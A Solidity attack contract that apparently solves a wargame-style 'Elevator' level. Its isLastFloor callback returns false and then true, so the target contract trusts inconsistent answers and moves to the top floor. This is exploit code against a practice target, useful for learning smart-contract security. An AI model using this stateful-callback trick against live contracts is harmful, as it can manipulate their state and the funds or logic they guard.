pragma solidity ^0.8.4;


interface IElevator {
    function goTo(uint _floor) external;
}

contract ElevatorProxy {
    bool firstCall;
    address targetAddr;

    constructor(address _targetAddr) {
        targetAddr = _targetAddr;
    }

    function attack() public {
        IElevator target = IElevator(targetAddr);
        firstCall = true;
        target.goTo(5);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            firstCall = true;
            return true;
        }        
    }
}